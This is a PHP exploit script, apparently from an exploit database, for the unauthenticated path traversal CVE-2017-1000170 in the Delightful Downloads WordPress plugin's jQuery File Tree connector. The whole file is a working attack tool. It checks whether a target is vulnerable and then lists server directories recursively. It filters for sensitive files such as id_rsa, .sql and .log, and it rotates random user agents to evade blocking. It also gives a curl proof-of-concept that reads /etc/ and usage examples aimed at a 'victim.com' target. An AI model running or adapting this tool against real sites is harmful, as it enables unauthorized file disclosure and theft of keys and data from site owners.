<?php

# Exploit Title: Delightful Downloads - Jquery File Tree 1.6.6 - Path Traversal
# Date: 19/03/2021
# Exploit Author: Nicholas Ferreira
# Vendor Homepage: https://github.com/A5hleyRich/delightful-downloads
# Version: <=1.6.6
# Tested on: Debian 11
# CVE : CVE-2017-1000170
# PHP version (exploit): 7.3.27
# POC: curl --data "dir=/etc/" http://example.com/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php

$vuln_file = "/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php"; // do not change

$agents = ["Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.0; Trident/3.0)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X; sl-SI) AppleWebKit/531.37.3 (KHTML, like Gecko) Version/4.0.5 Mobile/8B119 Safari/6531.37.3",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_6_6 rv:6.0) Gecko/20120629 Firefox/35.0",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.1)",
"Mozilla/5.0 (iPad; CPU OS 7_2_2 like Mac OS X; sl-SI) AppleWebKit/531.5.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B113 Safari/6531.5.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0) AppleWebKit/5321 (KHTML, like Gecko) Chrome/37.0.837.0 Mobile Safari/5321",
"Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.12.4 (KHTML, like Gecko) Version/5.1 Safari/535.12.4",
"Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X; en-US) AppleWebKit/531.18.4 (KHTML, like Gecko) Version/4.0.5 Mobile/8B118 Safari/6531.18.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.12.4 (KHTML, like Gecko) Version/4.0.3 Safari/531.12.4",
"Mozilla/5.0 (compatible; MSIE 5.0; Windows 98; Win 9x 4.90; Trident/5.0)",
"Opera/8.98 (Windows NT 5.0; en-US) Presto/2.11.268 Version/10.00",
"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X; sl-SI) AppleWebKit/534.16.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B111 Safari/6534.16.2",
"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100107 Firefox/36.0",
"Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.23.6 (KHTML, like Gecko) Version/4.0.2 Safari/535.23.6",
"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20120805 Firefox/36.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:7.0) Gecko/20130123 Firefox/37.0",
"Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.1)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_9 rv:6.0) Gecko/20190226 Firefox/36.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.39.1 (KHTML, like Gecko) Version/4.0.3 Safari/533.39.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:4.0) Gecko/20160603 Firefox/37.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/5341 (KHTML, like Gecko) Chrome/37.0.831.0 Mobile Safari/5341",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_9 rv:5.0; en-US) AppleWebKit/532.20.3 (KHTML, like Gecko) Version/4.0 Safari/532.20.3",
"Opera/9.74 (X11; Linux x86_64; sl-SI) Presto/2.10.265 Version/12.00",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/5340 (KHTML, like Gecko) Chrome/37.0.813.0 Mobile Safari/5340",
"Opera/9.60 (Windows NT 6.2; en-US) Presto/2.9.333 Version/11.00",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_8_2) AppleWebKit/5362 (KHTML, like Gecko) Chrome/40.0.862.0 Mobile Safari/5362",
"Opera/9.74 (Windows NT 5.0; en-US) Presto/2.8.188 Version/10.00",
"Mozilla/5.0 (Windows; U; Windows NT 4.0) AppleWebKit/531.17.1 (KHTML, like Gecko) Version/5.1 Safari/531.17.1",
"Opera/9.93 (Windows CE; sl-SI) Presto/2.12.174 Version/12.00",
"Opera/8.19 (X11; Linux i686; en-US) Presto/2.12.301 Version/10.00",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.7.2 (KHTML, like Gecko) Version/4.0.4 Safari/532.7.2",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 4.0; Trident/3.0)",
"Opera/9.71 (X11; Linux x86_64; en-US) Presto/2.12.270 Version/12.00",
"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.2; Trident/4.1)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2 rv:4.0) Gecko/20130506 Firefox/37.0",
"Mozilla/5.0 (Windows; U; Windows 95) AppleWebKit/531.44.7 (KHTML, like Gecko) Version/4.0.4 Safari/531.44.7",
"Mozilla/5.0 (Windows NT 6.1; en-US; rv:1.9.1.20) Gecko/20110731 Firefox/35.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/5341 (KHTML, like Gecko) Chrome/37.0.831.0 Mobile Safari/5341",
"Opera/9.74 (X11; Linux x86_64; sl-SI) Presto/2.10.265 Version/12.00",
"Opera/9.60 (Windows NT 6.2; en-US) Presto/2.9.333 Version/11.00",
"Mozilla/5.0 (iPad; CPU OS 7_0_2 like Mac OS X; en-US) AppleWebKit/535.7.5 (KHTML, like Gecko) Version/4.0.5 Mobile/8B115 Safari/6535.7.5",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_8_2) AppleWebKit/5362 (KHTML, like Gecko) Chrome/40.0.862.0 Mobile Safari/5362",
"Opera/9.74 (Windows NT 5.0; en-US) Presto/2.8.188 Version/10.00",
"Mozilla/5.0 (Windows; U; Windows NT 4.0) AppleWebKit/531.17.1 (KHTML, like Gecko) Version/5.1 Safari/531.17.1",
"Opera/9.93 (Windows CE; sl-SI) Presto/2.12.174 Version/12.00",
"Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/535.13.4 (KHTML, like Gecko) Version/4.0.4 Safari/535.13.4",
"Opera/8.19 (X11; Linux i686; en-US) Presto/2.12.301 Version/10.00",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.7.2 (KHTML, like Gecko) Version/4.0.4 Safari/532.7.2",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 4.0; Trident/3.0)",
"Opera/9.71 (X11; Linux x86_64; en-US) Presto/2.12.270 Version/12.00",
"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.2; Trident/4.1)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2 rv:4.0) Gecko/20130506 Firefox/37.0",
"Mozilla/5.0 (Windows; U; Windows 95) AppleWebKit/531.44.7 (KHTML, like Gecko) Version/4.0.4 Safari/531.44.7",
"Mozilla/5.0 (Windows NT 6.1; en-US; rv:1.9.1.20) Gecko/20110731 Firefox/35.0",
"Opera/8.11 (X11; Linux x86_64; en-US) Presto/2.11.165 Version/11.00",
"Mozilla/5.0 (iPad; CPU OS 7_2_1 like Mac OS X; en-US) AppleWebKit/532.33.6 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6532.33.6",
"Opera/9.71 (X11; Linux x86_64; sl-SI) Presto/2.10.180 Version/11.00",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:5.0) Gecko/20130122 Firefox/36.0",
"Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; Trident/3.0)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows 95; Trident/4.1)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.1)",
"Opera/8.33 (X11; Linux x86_64; en-US) Presto/2.8.320 Version/12.00",
"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20121221 Firefox/36.0",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_9 rv:4.0) Gecko/20200625 Firefox/35.0",
"Mozilla/5.0 (Windows NT 6.0; sl-SI; rv:1.9.0.20) Gecko/20200505 Firefox/37.0",
"Mozilla/5.0 (Windows; U; Windows NT 4.0) AppleWebKit/532.44.4 (KHTML, like Gecko) Version/5.0 Safari/532.44.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_9 rv:3.0) Gecko/20201229 Firefox/37.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.17.6 (KHTML, like Gecko) Version/4.1 Safari/531.17.6",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/5311 (KHTML, like Gecko) Chrome/38.0.877.0 Mobile Safari/5311",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.4.3 (KHTML, like Gecko) Version/5.1 Safari/531.4.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0 rv:4.0) Gecko/20140118 Firefox/35.0",
"Mozilla/5.0 (Windows 95) AppleWebKit/5330 (KHTML, like Gecko) Chrome/36.0.847.0 Mobile Safari/5330",
"Opera/8.39 (Windows 98; sl-SI) Presto/2.9.202 Version/11.00",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5 rv:3.0; en-US) AppleWebKit/534.11.4 (KHTML, like Gecko) Version/5.0 Safari/534.11.4"];


function post_request($url, $data, $random_agent = 0){
    global $agents;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, array("dir" => $data));
	#curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:8080");	//debug w/ burp
	if($random_agent){
		curl_setopt($ch, CURLOPT_USERAGENT, $agents[rand(0,count($agents)-1)]);
	}

    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

function parse_dir($str){ // by raina77ow =)
  $contents = array();
  $startFrom = $contentStart = $contentEnd = 0;
  while (false !== ($contentStart = strpos($str, 'rel="', $startFrom))){
    $contentStart += 5;
    $contentEnd = strpos($str, '">', $contentStart);
    if (false === $contentEnd){
      break;
    }
    $contents[] = substr($str, $contentStart, $contentEnd - $contentStart);
    $startFrom = $contentEnd + 2;
  }
  return $contents;
}


function list_files($url,$path, $recursive=0,$filter){
	global $vuln_file;
	global $recursive;
	global $random_agent;
	$exts = "";
	$extensions = "";
	$files = "";
	(count($filter) > 0) ? $has_filter = 1 : $has_filter = 0;

	$parsed = parse_dir(post_request($url.$vuln_file, $path, $random_agent)); // array tree

	foreach($parsed as $file_or_folder){
		if($has_filter){
			foreach($filter as $filtered){
				if(strpos($file_or_folder, $filtered) !== false){ //if the current file contains any of the filter
			        echo "  ".$file_or_folder."\n";
			        continue;
				}
				if(preg_match_all("#^\/.*\/$#", $file_or_folder)){ // is a folder
				    if($recursive){ //if recursive flag is set, enter on each folder and do it
				        list_files($url, $file_or_folder, $recursive, $filter);
				    }
				    continue 2; // continue the outermost foreach
				}
			}
		continue; // if has filter, always restart the loop here
		}

		if(preg_match_all("#^\/.*\/$#", $file_or_folder)){ // is a folder
		    if($recursive){ //if recursive flag is set, enter on each folder and do it
		        list_files($url, $file_or_folder, $recursive, $filter);
		    }else{
		        echo "  ".$file_or_folder."\n"; //if it's not to be recursive, just print the folder name
		    }
		}else{ //is a file
		    echo "  ".$file_or_folder."\n";
		}
		continue;
	}
}


function alert_user($target,$path, $recursive, $filter){ //scan the root of the server recursivelly can really be a pain
	if($path == "/" && $recursive == 1){
		echo red("  [i] WARNING: Scanning the root of the webserver recursivelly can
  exceed the timeout limit, block your IP or even take down the server.
  Are you sure you want to continue? [y/N] ");
		$handle = fopen ("php://stdin","r");
		$line = fgets($handle);
		if(trim(strtoupper($line)) != 'Y'){
		    echo "\n  Aborted. Try running me without the recursion flag\n\n";
		    exit;
		}
		fclose($handle);
		echo cyan("\n\n  Ok, don't say I didn't warn you...\n");
	}
	list_files($target,$path, $recursive, $filter);
}


############################################################

function green($str){
    return "\e[92m".$str."\e[0m";
}
function red($str){
    return "\e[91m".$str."\e[0m";
}
function yellow($str){
    return "\e[93m".$str."\e[0m";
}
function cyan($str){
    return "\e[96m".$str."\e[0m";
}

function banner(){
	echo "
  _____       _ _       _     _    __       _ _______
 |  __ \     | (_)     | |   | |  / _|     | |__   __|
 | |  | | ___| |_  __ _| |__ | |_| |_ _   _| |  | |_ __ ___  ___
 | |  | |/ _ \ | |/ _` |  _ \| __|  _| | | | |  | | ´__/ _ \/ _ \
 | |__| |  __/ | | (_| | | | | |_| | | |_| | |  | | | |  __/  __/
 |_____/ \___|_|_|\__, |_| |_|\__|_|  \__,_|_|  |_|_|  \___|\___|
   		   __/ |                ".green("Coder:  ").yellow("Nicholas Ferreira")."
 		  |___/				     0x7359

  ".cyan("Delightful Downloads - Jquery File Tree")."
  Unauthenticated Path Traversal exploit ".
red("\n  (CVE-2017-1000170)")."

";
}



// ======================= CHECKING =======================



$short_args = "u:h::p:r::f:a::";
$long_args = array("url:","help::","path:","recursive::","filter:","random-agent::");
$options = getopt($short_args, $long_args);

if($argc == 1){
	die(banner()."  Usage: php xpl_jqueryFileTree.php -u url [-x extensions] [-p path] [-r] [-h] [-a]\n\n  Help: -h or --help\n\n");
}

if(isset($options['h']) || isset($options['help'])){
banner();
die( "  Usage: php ".$argv[0]." -u url [-f extensions/filenames] [-p path] [-r] [-h] [-a]

  -h, --help: Show this message
  -u, --url: URL of target
  -a, --random-agent: Use random user agents
  -f, --filter: Name of files or extensions to search for (separated by comma)
  -p, --path: The full path from which the filenames will be read (default: /)
  -r, --recursive: Generates the tree recursivelly (be careful)

  e.g.: ".cyan($argv[0]." -u victim.com -f .zip,.sql -p /var/www/html/backup/admin/ -r")."
        |
         \-> This will search for all .zip and .sql files inside victim.com/backup/admin and its subpaths
             (You must provide the dot to indicate it's an extension)

        ".cyan($argv[0]." -u victim.com -f .log,id_rsa -a -r")."
        |
         \-> This will search for all files named \"id_rsa\" or having the extension
             \".log\" within all folders of the server, with random user-agents

        ".yellow("Tip: use \"php ..... | tee output\" to save the result to an output file")."


");

}

$random_agent = 0;
if(isset($options['a'])){
	$random_agent = 1;
}elseif(isset($options['random-agent'])){
	$random_agent = 1;
}

$target = "";
if(isset($options['u'])){
	$target = $options['u'];
}elseif(isset($options['url'])){
	$target = $options['url'];
}

$recursive = 0;
if(isset($options['r'])){
	$recursive = 1;
}elseif(isset($options['recursive'])){
	$recursive = 1;
}

$path = "/";
if(isset($options['p'])){
	$path = $options['p'];
}elseif(isset($options['path'])){
	$path = $options['p'];
}


if($path !== "/"){
	if(!preg_match("#^\/.*\/$#", $path)){
		$path = str_replace("//", "/", "/".$path."/"); // $path must be of the form /<path>/ for this to work, so lets force it
	}
}


$extensions = "";
if(isset($options['f'])){
	$extensions = $options['f'];			//strings
}elseif(isset($options['filter'])){
	$extensions = $options['filter'];	//string
}

$filter = array();

if($extensions !== ""){
	$filter = explode(",", $extensions);
}


// ========================= END CHECKING ==========================

function is_vulnerable($url){
	global $vuln_file;
	global $random_agent;
	global $filter;

	echo "  [*] Target: ".$url."\n";
	if(count($filter) > 0){
		echo "  [*] Filter: ".implode(", ", $filter)."\n\n";
	}
	echo cyan("  [i] Checking if the target is vulnerable...\n");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url.$vuln_file);
    curl_setopt($ch, CURLOPT_NOBODY, true); // HEAD request to vulnerable file
	curl_exec($ch);
 	$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

	if(substr($code,0,1) == 2){ // 2xx
		echo yellow("  [i] HTTP response of vulnerable file is 2xx. May be vulnerable!\n");
		$post = post_request($url.$vuln_file, "/", $random_agent);
		if(preg_match_all("/jqueryfiletree.*(bin|boot|dev|etc|var|usr|windows|users|temp)/", strtolower($post))){
			echo green("  [+] Target is vulnerable! Getting file list...\n\n");
			return true;
		}
		echo red("  [-] Target is not vulnerable... =(\n\n");
	}else{
		echo red("  [-] Could not find a valid vulnerable file. Maybe it doesn't exist, 
  you don't have permission to read it or it is in another directory.\n");
	}
	return false;
}
banner();

if(is_vulnerable($target)){
	global $filter;
	alert_user($target,$path, $recursive, $filter);
	echo green("\n  [+] Done!\n\n");
}

?>
